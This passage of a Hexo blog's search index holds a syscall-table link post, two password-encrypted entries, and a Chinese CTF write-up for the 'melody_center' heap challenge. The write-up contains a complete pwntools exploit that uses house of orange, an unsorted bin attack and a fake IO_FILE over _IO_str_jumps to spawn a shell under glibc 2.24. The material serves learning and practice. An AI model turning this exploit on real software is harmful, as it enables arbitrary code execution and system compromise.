3409db04e3f5d1eaa5a73543d7b3afe4c3165ef5162071520d38d83e2ff36448ac1d57b1f3566d2341976d6018dcde8011af1c90941c2ed6aabc6ebd513b7f4bf7000ab4198935a3b1a759c233a06796fb9e1810603022aeb9481a105dc2a15c68407afe16175f55b85e3b3245afc7054e780b2564e10aec91336b8efe02e2d5501deb17caa5f77d6c49026457825bd1bfba2f83d832fcfbcfd6642cb0995fa258ae6ed6c9a9a61b3dac08fdfec3c764ce31de294d3f5831481f90c88af0fa6fdc116ddd01f8074ca1dfc16ba8a251b0e0bbbecd1f304e05d721cc50ce8b3a7fbb904071cc02e1f16174edbce44aaeb6a4a57d4dbfe99bd106c415458e052ce1c127837f5798498da0e54c25cc5753c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a><br><br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2e033ed4cf72f94c12d94063f8d6abcdfd40c96ed73ea9d0746c11be62f5a216">1abbbc9bbb000e644efdb654879f12220bbbf4c342858fc9b2d928f00267d19b2af08ff847a7fd226f76e946514c996832eb4b552f293183335206ed7638ff79968184cc80358edb0820e6aa93b9417abfbb517ee384d9a3272df7a273c6329def4501e34542c0047a2ed77b394405d173f41705031d18db75abac173c280a06a12fac25c8c4ff456f402775b9d0123f822ec470588dd0ee2e49cb04cc0b3ba5df153da9dd13f8c8ab14e43c41fafca84d6d062e14b19c37bd7960cc0c1ab4cef14b72d30360dadce02c215d9d1ce2dcc4a38b28bb5adb1569c814097c8dd75f18728399b4e888f209360b729c2ff011f3c3eee4cf561e9e82fae7ba138c44cd324ab90598174eab0d509d0aa660acdf795e72eb8d1ea57ac6a3d621d35d138a4e912b4122e718856725763e968d4857be819a68a2873675333982d2523a2cff2fae29eb660ee6238a6592d72c921559ecd5b9d67f3a3d1cb7288a42b8c6452c338084f4cfeb9c548150cbde52e120f261109f4da1364bb83c8545d31e88d38532e6a5c16fb248db5f0527f6dcf345f125e3b04c53aa26054d43a8127eaa6cbd2bef557127be8292287dd87f22969b7ed72b4378f35e07fb01e14569247fe96e158c7cc5b7dac4ca6bb682198bbe88bb10edde28dbb5c1bf27d4eeb8c46288ae217068ff0a6e50718d674db362c2014926e6866e133e3d49e108cf31eb9af94a466018eeb7b4ec6b0da041c74a0c411d908673edd6732a50d2a2114a984710a4c1ff76d2a3e829f9c46b28e84f61cfbfb504058e54ecaf4b9880e03fdbb36fe03616557ea00b26dc9e2602411370fdb4035aa625130b8dac42971afb47dd49644f9c1aa4b4d71b2584870ddfd12e1970544dbd5914e9e5aa9250cdfaa9d43a4afd57557d9e68b70b8fb1cf9b5728a0d8d6f5860b20ce92eecf7d8a73e14a6fc6d241ec441b75d6d8f58223ced44ba426ad5bee54a4cadb9ec6062c8c13067f06f3a0474ace5cb00529e761d3c02628dd7b6fac5f9339af99acfb3165f514b5e00dda75a1fc3913fadee3707dd2f16a26c3f877e83bc84c795a7685a0ec9bd375d7edaec10780a9af4fe4222b590bf493cb87d7918c924a70d59e50d26bbe42bc7a92a49b971d97467d487a7a300c69ed6caffcb58b6673b2dc999fb83f73d29fa1ba5e2e36c7722141e86f8777997d78e43df45f2cdf1ad2c7ba296a068b7f666625ee8a6e50a6638c85e972baa82fa4ae32b16712d7c5fa22895b513b900b69d0d746182d31ef466d86e1950a31b9d20cd8b49993282c69f195454154ea465ab9408171510e9792b165b171007c84edd9ba3dcbed197d4869e532e9064f4e91987e48f865cdf9d874494a2020efe3b87d5218258dccf8c264e1285d6ffa6efcdbd0ac769a4282613737b76afab158f466812a7f77e1dab55ebdec687ff88ff32e665d1fb1816c5d81ef6a4c21ad85ef26221edc67e0f5ddb1484750107d33601a652f809a31ae28e6d64904ed49d44a07232dbc99fd4af07f521fad29a6664602d5901b66338ec6673d8fb78fb21e6332395ace78a9ad60fc3c5429fc92c584d91a226f6b40c1f8894c88fffdcd336d8b8e17388e2add8954a9bbf67c55e8316b081f57a9439571aeded196cb36f27b7aeaedf528afdad4f8c5ee292883f661c2b59d4b54d01851b134295f8476ed2d49587c2ba52aaa098cfaad14dbc0bd2630843212913e91b85e6a873816e88cd340143475dcda7fb669e38c3a3eb668215c26b223ee2d53ca2704df71838c1d5079dd5d9eb20b451eda2969dfb8dc414debfadb39eb73d4325630a4c35fb9637518c8890730640d99892850ccb48503f3e43bd02e03e8002e19ddfd086c2a19b972e56b3ff1a7db5c9ae114a8e075c1f7e268eb290e261180f10f9b713d030a408ad46e55f3b624e016ac2d3613375daaa981ffc8e7400dfa7db6f7474cdeabe3035dabdf2c41f8bdde8aca4f6a9d563ffce7e6135bf72641ba35b2a5c29193791ff127afe061ddeeef88d5b1e901965e3ffa99576692b2f681aabcb4067729a5c07a1098227fcef28139235b58a9201003f09e09bc2642fa84db36d51b7317ba826c9829e5dea37d58b517d9e067a24ebff66e47154cace057b50e065298585a32d6a763126bb49cfc13de9a9aa17b6211483639332a181fa04f4062f80f1a4caf1c7696ff3e9177af51af1bf7feb62718ffc3c0d15aed62dd1fd3930de679a71bf9133b08beb70c583de154a211cd9346d75cd1ecf5ee5d81c4cdb9ca9e6968c9b8d28edb6893845648222d6171d76ecbf73504b7a18563808a3cdd520e5c9ebbd83b0769506678b371d231a584eabadad269dfe50257bd65379d33f793a06a617dac53e50a686f395b433b6b873c93475bd2908fab8f5d92f384665e63cfa8e2cecf129775fb87615e4ba9a21f9abae26fa4d9942fe24b51e3f530c758700449cf3fb55ab8cb3ba7d8043036d755647ee98904297c8d485811cf35778387b15327080167be88b972192f5c633b3e15d39c0cf6eb2baab8bef90c17e16aed156ff882cd7963fce55849b0261bd52ea9d5cea667a5a49485d0bbb7fb1e3053672d0d312e119bdfe6db008d7f419544702ee0afb883079e7ba1f9897376c098322dc0d7584d59aa0a8ad0d4ef4d5e3032bb8542062d60e0fde627de0de2f1b3fc809ddb775e03cfcd1cfd498a4f8983ff5b5e1c36cfeb72cefb6035c0e2cb52dc2c01c03dcec309e7ef757ae9807b7eb708b1c3374983e6d3833201274eb8e945f1a6c021b01563ad3857a2723652d82c28683b6bf0708a58431d6f5500bd1aa8d5f98ae36e0b4f78365c719341dd9d0423b86b9311f82ec3109f6bdb3f657b6d29440290174e9953db82bd653dcb3daa0f0ea78a270023eef038d52dd3d8bd8532cffb428b0e152b2b2d32fa5e10117e9f112054950b065a926f891a21c34c064fad51c720602736e481e03277b3da5c3be9b6511254225a9c0df89ad5530cb9f3525301756e779deb6afad9daa5680040c1d265c76bcd08613709496e1febfc1c4a8e0c9eb4644741c3a5d381ae6e8792e56a58a9e2e93b088fc8ab74e695cedce661d41f0ecdd10e13532782a3b1553372ed6e0c7d30ef229c2faf2bb5947fdf41c9727b9cd17866d265942d9f245bddc47dddd58202fd3aafc94e35b4ec915412ecfc17e44c6ce87045d21b0f1fead5870cee5ba4daec18a1e5523814197fe637a96cfa82910303e7c822d7bb9012dab544af22070281e1fb3ef5bc7d3ef0bef3a789aa1127649d1ea53e516aa3c8af79cf4a09e38668226198d7b31b2ed6c6e6153907e0ad54e26df1662840e625130a18aedf60dd724efc8924c7ba7aa158999c1430095e97d371a814825b7516577c338664d2b6ba8ff8ace526445001ec978a77e8cd5bbf1a8054471969d14fefe7e799d639312ddf1ae6f1a115d117d1191f4511f5f1dcb5109f017cdc5dfdad76768d60c82d83a3e69d4afd8425e9f1b6a5c8c1140abe0eb007237e57fe5725280557940a6290e79d529d0495e2c00908a16ea2aa60c1f883c492ef2068ac2844f7c59d448687737de0382cc273501ebb28207121d4fe1f29be5a78e7edd841c0e319853f623c6a952afe40bb0f9139fd1c83e3b67f5ed0addaff6538709ba8e584196ee44eba4b61e6cd96d3ed96a446dac51764ba26f293d03e13b0446593f27edc9a60acfc5b297c1ba9740684a0ea04dba840375efa4d67e72a26c19ed934ea3cf1ef0a9541bffc6bab66a6e836fdf65f41d81d19b1c37f3eb13b67cea5ed0d063fd36003d2466bf05dc85bd5ee782eab5fd3cbfa7d1b517f5a79abf33d5edfc500c85ab19aa59d248fdd114bb6c1aa77000273d426b515f24cbaa5b14fd0d39afd9ca736e7ea4590a9e3024573a6d589d4e47dddb9760057e0a98367e3f4ec28356dc46af5644a850bf1a91c7b6cf718925cdc4019f6a5a116d8a2cd9c2a812ec741e337e2c950e8aec4d7389c36cc5c9075c245657459f178caea6a5f040d30305fc150dc0f5abcde880928071050600195a5a1231469352c7e3e1e7af103e946a9edbd1e68259e09c327dee214de5d99d0210e61138eeb3ecd064a08e4bad1080c4e39d9cb23e2c4ad78275f996a69137f49edc45cc4b88379ffa95b67c61899c3fd1ff928a53ea3d0144740f3db9a4234e79d372a72663e7579cb623bec2d26e3e5ee94beb1cb2d5b53cfb64ebc22123e5e6cf670dfb6a5a6fc5f8a7af6ea6c3f3696360154cc9d7a8b40e99e9dfcc50efce00dbb786bc54b9ddaa8a2802a0e14751e0b5e1ea7831509e3041c2c51a7188294f40a2b8674f5a42a79fc88c0e271fc8c4877985808989f27e95e7ae12d5fb572eff72aa7e64c3190ba5a73247bdcfd0df196c4f20ed9c983ff7efeaed4292552950a8ea48b76fcb430c51dcf8214b90ec45242fe0a46afbf1bf90fb786e792c0230be9489f852b3943dbb9a2f668205ef81d24749a32f484b33105405ad613ec3678ade370bde0ab1770f1c67b68808da8fb3e73eb2f364be01d4d022eb03d14b12a1aca3e7934683d67aa71826f8d0e46c8b0a40d7a5d73102c2d9370f0b3edafe5eed2b55cf5ae8379b44bee6538a4ca88aa31444068f6cda899e8744e65a0075ffa0f99abda1940bbc096a00dc77e072ef86e7df758bb7c92d56d88592709af30b3a8b2fb8367573475d1a86b9307039d7239c240819929ec9c51e19e073595a719e5d685032198c81f639bd43c23639a8dddd6a0f135b3f607106121d68099765c7ff886e31e84287786aa7409cd3a70fffc0c5d813492c9c7c3b8fb0cfad7b410efa5f42ccf5c3531845f20fd8390b6f99809aa09e79e5f39d440f93bf97e80e2200bed4b0b2af8ee0634ba6290bb2ec26bc33f325fb3f25832c287b4b3c324e4153a75932b0594a0e730bb5bb7b086adcc2b01b838cea975908a09689429a2841f82aa144b3f5355e8c8218b66498a99e2c8d85c5727888599dcc2470d237903af5fb8b2434cce2a5585b42d7d809ddd2914bdcb83d1928e08216dc900a5eb783149376116cfcc0f935f22064f708dbdfbe6cb8d06a98fcd611927a8a3cfdbe6a0a05fb6b202d7859ef3b867e9a697adbfac5575d7147daa5eb4dd36d2f09e43ec88f8973dab4aa24d1406b95593e6b550659a7cf580e396a79d096267ca08bf4844f41bcee798a8ae53a30997cef967ff8de22c6a57030b42bb3fcf8df2c089057e814ac7c4c46fc76749fa76021c96d243719273bcc15487122f599abef61feb6716c24c47333e0db24a75548f4ae5e372599a9422b3b9ad657da2d058e8d0ae617d3d105e27122bbf4cd4b2938188c3b2c6c19a082fcd477a4d9ac6cc32e1ba5338445bea30d5beea5f81ebafb6f9f272aff1d0395ce210b342a0e9fb2daf658783b4769ec2f5e98798338fc46dbfa0551cfb2800e2cd88ed6475b6eb9254fe74e17aae4a1bb512e99ebdea0f8c7d9ef4cd5127e2934bd3ad2800d85aa0927334d1acab6cd4d6adbcaf375ad20cd626526f7241759e5093e22401ec0f8076c040dc7a41604cda3d127e3224352373af1e24be4f0028930c4bb7a60ae4c07a3bf28b34cc3a82b6fcd94063b0ab65fa08b615f8d82d0c7dc2e9f2e09f592a1144f39f7464f802bb095eebec2bfb87542e9a41f9ae500d639c6a469a48a0ecfddf01288e1d931d8e21f9ff79c8d27d869feb527b0b898d5684407f770bf885375e75eaa326e96dced0e8a53b760e4062981d941d5847762b9bbb1cd7eac409b19eb47bb77d4686a4043350a1ee8b9037f6aeb98692887f2f77ccd349a32ad3f9b8a1763d0e37732d0344efb43dd9db415c9bc67d673d962781ef2fb698b304703908a7f8e29c69de93876193864b1c8fe7d0230e23d5acdd78839b6ad0c23029114c341500458da93222b34f10953fb6cc5dc9e226c686b37f9c3538ab3a4cb9fd238462901ee2b22befe60b57192bd1c063de2b83685d0d47f630053260ba7bd2bfd0de26451b859e0677c02594a44fde78a605527e41865d553365e9d9ef8c493e2ffe829bd7d7319daffe58ab70636e182de33c1d1f4fd7b37965efed2b1ddee8c16a81fb9f774392a0f4a589d7049e9010c93ba286d6aeae914836e265db0b2a9902a29a1ee5f3f034a795160fc9bbbc2551a3c014acc7b8c67a4cb3ebfd009615a93a763570007156a0168a52df259e4c30c4752a8628c5a244dd701d44e7bef502564fc17b83fbea0dfc6da874d409fd4dc93a48c56f4dc6e6a175fcf7a626f3e3545781596b91aac3629613063c37d864a7d4b9f1ffe3de46230a9e0ef813cd80a8caeabb0d66f24ddda9f0ab715bfcabd6ea722b4cd5281d540ce9b14c53fb6e416962cb0803b6dcfc26dc3a91dd4db33dfbea2c54c4e5c30abe4f4e10ae44b1c4e451dad70e64f5be030707ee4d2e0bab524c82e17c794d2801d56020b3f4932a83d21a56ba3e61fe982ca3512652a140b78be13a1fecd81822096bea398ba0e765f6cd8b3c42554e6a98c069a52fcd6de0482abec4bebde752982a81990a41ddc3ada5c3cbdfe900a67f30214e2554a96e5aab0dc2d7ea206a213c45f8429a404af1efa4105466802ab706be53a040891f7a1a830f0fe8a9fd39a0581c4792743a17ab67b7dfcadbad932b408160191f3bd5342de5adee4863c75e818ce700b63e17c7d4f0f2f6e7b6320a88c8989bb85db8257bbbe38ae6469065bd38405e85e1a32da2d8c0f083884a5c344bb752c09fb66bb08c0390563d1bb367af8d3057c185499cef54f275d2596249ce79daaefda9e7471a9d488a65ee83811c4de1efe60e088dd04bcc77133c20712909746d7c013617fe457c9691fc00527bf0e0c1424686068c2867fdac36f821520a238bd77c88dc096eaf43bb09bc74732a53428ceffb0dc21bd857eee5b3ad53eb23164dfa5ac01d721e0a1ab07f2a73f51fe61e1bc50c4263aa9a12d095353a175b1b1c992e3b9d05be1e126c8c88b2bda88fc33d6ddcbddd10cbd502232cc722297748f891e7bf89ac4bdfcf96a352e7343f3b980f4a3be4015e210bb5ffe3f15b7ccc0e7bd398b44a006a2f36d06be933721356850dd33c4180eb5fb66c4c9875a756e7229e1d8b411a271982b363c92588</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
